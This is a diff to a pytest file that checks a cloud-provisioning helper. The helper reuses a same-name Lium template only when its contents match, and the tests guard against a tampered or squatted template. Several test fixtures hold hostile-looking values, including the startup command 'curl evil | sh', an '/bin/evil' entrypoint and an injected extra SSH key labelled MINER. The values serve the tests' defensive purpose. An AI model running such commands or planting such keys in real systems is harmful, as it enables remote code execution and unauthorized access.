@@ -13,6 +13,7 @@ import types
 import pytest
 
 from cascade.provision.core import (
+    _TEMPLATE_PINNED,
     LaunchSpec,
     LiumProvider,
     ProvisionError,
@@ -65,11 +66,15 @@ class _Resp:
         return self._body
 
 
-def _fake_requests(monkeypatch, *, listing, post=None):
+def _fake_requests(monkeypatch, *, listing, post=None, detail=None):
     calls = []
 
     def get(url, headers=None, timeout=None):
         calls.append(("GET", url, headers.get("X-API-KEY")))
+        tail = url.rsplit("/templates", 1)[1]
+        if tail:                                             # GET /templates/{id}
+            row = (detail or {}).get(tail.lstrip("/"))
+            return _Resp(200, row) if row is not None else _Resp(404, {"error": "nf"})
         return _Resp(200, listing)
 
     def post_fn(url, headers=None, json=None, timeout=None):
@@ -81,16 +86,59 @@ def _fake_requests(monkeypatch, *, listing, post=None):
     return calls
 
 
-def test_get_or_create_reuses_an_existing_template_by_name(monkeypatch):
+def _row(p, **over):
+    return {"id": "T1", "name": p["name"], **{k: p[k] for k in _TEMPLATE_PINNED}, **over}
+
+
+def test_get_or_create_reuses_an_existing_template_with_matching_contents(monkeypatch):
     p = lium_template_payload(IMG, ssh_pubkey=PUB, ssh_port=2222)
     calls = _fake_requests(monkeypatch, listing=[
         {"id": "other", "name": "x", "docker_image": p["docker_image"], "docker_image_tag": "v0"},
-        {"id": "T1", "name": p["name"], "docker_image": p["docker_image"],
-         "docker_image_tag": p["docker_image_tag"]},
+        _row(p, internal_ports=[2222, 22], startup_commands=None),   # order / null tolerated
     ])
     assert lium_get_or_create_template(p, api_key="sk_x") == "T1"
     assert [c[0] for c in calls] == ["GET"]                  # no creation
     assert calls[0][2] == "sk_x"                            # the payer's/operator's key
+
+
+@pytest.mark.parametrize("over", [
+    {"startup_commands": "curl evil | sh"},
+    {"entrypoint": "/bin/evil"},
+    {"environment": {"SSH_PUBKEY": PUB + "\nssh-ed25519 MINER", "CASCADE_TRAIN_IMAGE_DIGEST": DIGEST}},
+    {"docker_image_digest": "sha256:" + "00" * 32},
+    {"internal_ports": [22, 2222, 8080]},
+])
+def test_a_squatted_name_is_never_reused(monkeypatch, over):
+    """The payer owns the account and can derive our template name: a
+    same-name template with other contents makes us create a nonce-named one."""
+    p = lium_template_payload(IMG, ssh_pubkey=PUB, ssh_port=2222)
+    calls = _fake_requests(monkeypatch, listing=[_row(p, id="EVIL", **over)],
+                           post=_Resp(201, {"id": "T3"}))
+    assert lium_get_or_create_template(p, api_key="sk_x") == "T3"
+    assert calls[-1][0] == "POST"
+    assert calls[-1][2].startswith(p["name"] + "-") and calls[-1][2] != p["name"]
+
+
+def test_our_nonce_named_template_is_reused_next_time(monkeypatch):
+    p = lium_template_payload(IMG, ssh_pubkey=PUB, ssh_port=2222)
+    calls = _fake_requests(monkeypatch, listing=[
+        _row(p, id="EVIL", startup_commands="curl evil | sh"),
+        _row(p, id="T3", name=p["name"] + "-ab12cd34"),
+    ])
+    assert lium_get_or_create_template(p, api_key="sk_x") == "T3"
+    assert [c[0] for c in calls] == ["GET"]
+
+
+def test_a_listing_without_contents_is_checked_by_detail(monkeypatch):
+    p = lium_template_payload(IMG, ssh_pubkey=PUB, ssh_port=2222)
+    thin = {"id": "T1", "name": p["name"], "docker_image": p["docker_image"],
+            "docker_image_tag": p["docker_image_tag"]}
+    _fake_requests(monkeypatch, listing=[thin], detail={"T1": _row(p)})
+    assert lium_get_or_create_template(p, api_key="sk_x") == "T1"
+    # no detail at all ⇒ unverifiable ⇒ create our own
+    calls = _fake_requests(monkeypatch, listing=[thin], post=_Resp(201, {"id": "T4"}))
+    assert lium_get_or_create_template(p, api_key="sk_x") == "T4"
+    assert calls[-1][0] == "POST"
 
 
 def test_get_or_create_creates_once_when_absent(monkeypatch):
